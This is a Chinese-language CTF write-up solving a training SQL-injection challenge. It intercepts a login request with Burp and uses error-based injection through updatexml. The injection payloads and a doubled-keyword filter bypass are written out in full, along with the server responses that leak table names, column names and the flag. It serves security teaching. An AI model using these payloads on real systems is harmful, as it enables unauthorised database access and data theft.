# [N1book web入门]SQL注入2

**标签：`报错注入` `sql绕过` `brup` `HeckBar`**

> 链接：[[N1book web入门]SQL注入2](https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%80%E7%AB%A0%20web%E5%85%A5%E9%97%A8]SQL%E6%B3%A8%E5%85%A5-2)

我把这个题当作报错注入的一道例题

**准备`brup`**

这道题需要用到`brup`去看返回的报错信息，`postman`都看不到，因此需要自行准备下`brup`

**信息收集**

查看源代码，发现

```
<!-- 如果觉得太难了，可以在url后加入?tips=1 开启mysql错误提示,使用burp发包就可以看到啦-->
```

ok，思路来了，就是对着提示所说的url发个包，看看报错信息。但是发什么包（GET?POST?），带什么参数都还不知道，我们可以先随便填一个用户名和密码试一下，看一下数据包

去控制台看一下数据包，发现执行登陆后前端发送了一个`login.php`的数据包，于是可以发现：

* `method`: `POST`
* `params`: `name=1&pass=1`

接下来就可以发包了

**使用`brup`发包**

首先需要开启代理 `127.0.0.1:8080`

开代理后每一次请求都会被`brup`所拦截，使用感受就像是在写`C++`程序时的单步调试一样

这里我们使用`HeckBar`对`url`发送第一个请求

> `HeckBar`是我看一个视频中介绍的一个`Chrome`插件，可以帮助你进行sql注入

![](E:../../../statics\img\CTF\13.png)

然后去`brup`中，发现他已经拦截到了这次访问

<img src="E:../../../statics\img\CTF\14.png" style="zoom:67%;" />

右键，选择 `Send to Repeater`，准备开始发送数据包

<img src="E:../../../statics\img\CTF\15.png" style="zoom:67%;" />

这里发送的`name=test'`，多了一个右引号，于是有了SQL语法错误，错误信息也被捕捉到了

继续尝试**报错注入**

直接来查表

```
name=test' and updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database())),1) # &pass=xxxx
```

发过去后返回：

```
string(217) "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'from information_schema.tables where table_schema=database())),1) # '' at line 1"
{"error":1,"msg":"\u8d26\u53f7\u4e0d\u5b58\u5728"}
```

它提示我们有个SQL语法错误，但实际上我们很自信输入的SQL语句没有错误，而且错误点出现在from前，那我们有理由猜测，开发者过滤了`select`，于是我们就可以使用**双写绕过**

> 所谓双写绕过，举个例子，在`select`中间再写上一个`select`，中间的`select`是连续的，会被过滤，过滤后两端就会被拼接起来，还是`select`，好阴险！
>
> sel~~select~~ect	-->	`select`

于是可以修改：

```
string(33) "XPATH syntax error: '~fl4g,users'"
{"error":1,"msg":"\u8d26\u53f7\u4e0d\u5b58\u5728"}
```

然后就找到了，继续挖

```
name=test' and updatexml(1, concat(0x7e, (selselectect group_concat(column_name) from information_schema.columns where table_name='fl4g')),1) # &pass=xxxx
```

回显

```
string(27) "XPATH syntax error: '~flag'"
{"error":1,"msg":"\u8d26\u53f7\u4e0d\u5b58\u5728"}
```

接近胜利

```
name=test' and updatexml(1, concat(0x7e, (selselectect flag from fl4g)),1) # &pass=xxxx
```

回显

```
string(49) "XPATH syntax error: '~n1book{login_sqli_is_nice}'"
{"error":1,"msg":"\u8d26\u53f7\u4e0d\u5b58\u5728"}
```

大功告成！

> `双写绕过`典型题目：
>
> * [BabySQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]BabySQL)